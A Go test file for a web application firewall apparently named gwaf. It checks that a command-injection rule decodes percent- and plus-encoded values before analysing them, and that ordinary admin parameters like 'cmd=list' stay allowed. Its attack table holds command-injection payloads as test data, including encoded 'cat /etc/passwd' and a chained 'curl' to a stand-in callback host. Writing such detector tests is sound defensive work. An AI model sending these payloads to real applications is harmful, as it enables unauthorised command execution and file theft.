// Copyright (c) 2026 Gembit Soultan Shirazi <gembit.soultan@gmail.com>. All rights reserved.

package core_test

import (
	"testing"

	"github.com/gsoultan/gwaf"
	"github.com/gsoultan/gwaf/rules"
	"github.com/gsoultan/gwaf/ruleset/core"
)

func sinkWAF(t *testing.T) *gwaf.WAF {
	t.Helper()
	w, err := gwaf.New(gwaf.WithRuleset(rules.Set{core.CommandSinkRule(4022)}))
	if err != nil {
		t.Fatal(err)
	}
	return w
}

func sinkBlocked(t *testing.T, w *gwaf.WAF, k, v string) bool {
	t.Helper()
	tx := w.NewTransaction()
	defer tx.Close()
	tx.SetRequestLine("GET", "/x", "HTTP/1.1")
	tx.AddArgument(k, v)
	return tx.ProcessRequestHeaders().Blocked()
}

// TestCommandSinkSeesTheValueTheShellWillSee is the regression for a bypass
// found while classifying the RCE misses in the nuclei corpus.
//
// CommandSinkRule is nominated by the argument *name*, so it carries no
// transform chain — "names arrive already decoded", which is true of names and
// not of the value the operator then goes and reads. It fetched the sibling
// value straight out of the corpus and analysed it raw, so percent-encoding the
// spaces was enough to evade it:
//
//	cmd=nslookup oast.example.com     blocked
//	cmd=nslookup%20oast.example.com   allowed
//	cmd=echo -n X|md5sum              blocked
//	cmd=echo%20-n%20X%7cmd5sum        allowed
//
// The application decodes before it reaches the shell. A detector that reads a
// parameter destined for a shell and does not decode it is reading a different
// string than the one that will execute — which is the whole failure mode the
// multi-interpretation invariant exists to prevent (CLAUDE.md §2). CVE-2023-45878
// in the corpus is exactly this shape: `?cmd=nslookup+oast.example.com`.
//
// Payloads carrying a second signal never regressed: "cat%20/etc/passwd" was
// always caught, because scanPaths finds /etc/passwd whatever the spacing. That
// is why this survived — the obvious test case passes either way.
func TestCommandSinkSeesTheValueTheShellWillSee(t *testing.T) {
	w := sinkWAF(t)

	attacks := []struct{ name, value string }{
		{"plain", "nslookup oast.example.com"},
		{"percent space", "nslookup%20oast.example.com"},
		{"plus space", "nslookup+oast.example.com"},
		{"pipe, plain", "echo -n X|md5sum"},
		{"pipe percent-encoded", "echo%20-n%20X%7cmd5sum"},
		{"pipe, plus spacing", "echo+-n+X%7Cmd5sum"},
		{"path, plain", "cat /etc/passwd"},
		{"path, percent space", "cat%20/etc/passwd"},
		{"fully encoded", "%63%61%74%20%2fetc%2fpasswd"},
		{"chained", "id%3bcurl%20oast.example.com"},
	}
	for _, a := range attacks {
		t.Run(a.name, func(t *testing.T) {
			if !sinkBlocked(t, w, "cmd", a.value) {
				t.Errorf("cmd=%q was allowed; the application decodes this before "+
					"the shell sees it, so the detector has to as well", a.value)
			}
		})
	}
}

// TestCommandSinkStillRejectsOrdinaryAdminTraffic is the other half, and the
// reason the suppression it lifts exists at all.
//
// "cmd=list" is how half of all admin UIs are written. Decoding the value must
// not turn this rule into one that fires on any parameter named cmd, or the
// fix for the bypass above costs more than the bypass did.
func TestCommandSinkStillRejectsOrdinaryAdminTraffic(t *testing.T) {
	w := sinkWAF(t)

	benign := []struct{ key, value string }{
		{"cmd", "list"},
		{"cmd", "status"},
		{"cmd", "get_user_list"},
		{"cmd", "cgi_user_add"},
		{"cmd", "refresh"},
		{"cmd", "mkfile"},
		{"cmd", "resize"},
		{"cmd", "sc"},
		{"cmd", "12345"},
		{"cmd", ""},
		{"cmd", "user%20list"},
		{"exec", "true"},
		{"command", "model"},
		// Not a sink name at all: the stored-command-line suppression applies and
		// this must stay quiet however it is encoded.
		{"note", "cat VERSION | tr -d x"},
		{"script", "echo%20hello"},
	}
	for _, b := range benign {
		t.Run(b.key+"="+b.value, func(t *testing.T) {
			if sinkBlocked(t, w, b.key, b.value) {
				t.Errorf("%s=%q was blocked; this is ordinary admin traffic",
					b.key, b.value)
			}
		})
	}
}
